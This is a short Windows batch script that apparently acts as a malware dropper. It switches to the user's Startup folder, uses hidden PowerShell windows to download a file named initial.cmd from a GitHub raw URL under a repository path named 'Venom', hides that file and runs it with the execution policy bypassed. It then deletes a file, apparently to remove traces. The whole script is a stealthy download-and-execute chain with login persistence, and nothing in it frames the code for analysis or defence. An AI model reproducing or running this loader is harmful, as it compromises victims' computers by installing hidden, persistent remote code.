@echo off

set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

cd %STARTUP%

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/initial.cmd -OutFile initial.cmd"

attrib +h "%STARTUP%/initial.cmd"

powershell -windowstyle hidden -ExecutionPolicy Bypass ./initial.cmd

cd "%INITIALPATH%"

del initial1.cmd
